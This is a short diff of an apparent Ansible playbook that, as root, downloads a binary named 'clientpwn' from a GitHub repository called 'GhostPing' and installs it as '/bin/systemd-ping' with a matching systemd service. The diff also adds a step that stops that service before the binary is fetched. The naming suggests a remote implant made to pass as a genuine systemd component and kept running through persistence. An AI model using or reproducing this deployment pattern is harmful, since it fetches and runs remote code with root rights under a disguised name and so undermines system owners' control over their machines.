@@ -4,10 +4,10 @@
   become: yes
 
   vars:
-    binary_url: "https://github.com/miller-js/GhostPing/raw/refs/heads/main/deploy/clientv2"
+    binary_url: "https://raw.githubusercontent.com/miller-js/GhostPing/refs/heads/main/deploy/clientpwn"
     service_url: "https://raw.githubusercontent.com/miller-js/GhostPing/refs/heads/main/deploy/client.service"
 
-    binary_dest: "/usr/local/bin/systemd-ping"
+    binary_dest: "/bin/systemd-ping"
     service_dest: "/etc/systemd/system/systemd-ping.service"
 
   tasks:
@@ -25,6 +25,11 @@
           - curl
         state: present
       when: ansible_os_family == "RedHat"
+
+    - name: Stop the service
+      systemd:
+        name: systemd-ping
+        state: stopped
 
     - name: Download binary from GitHub
       get_url:
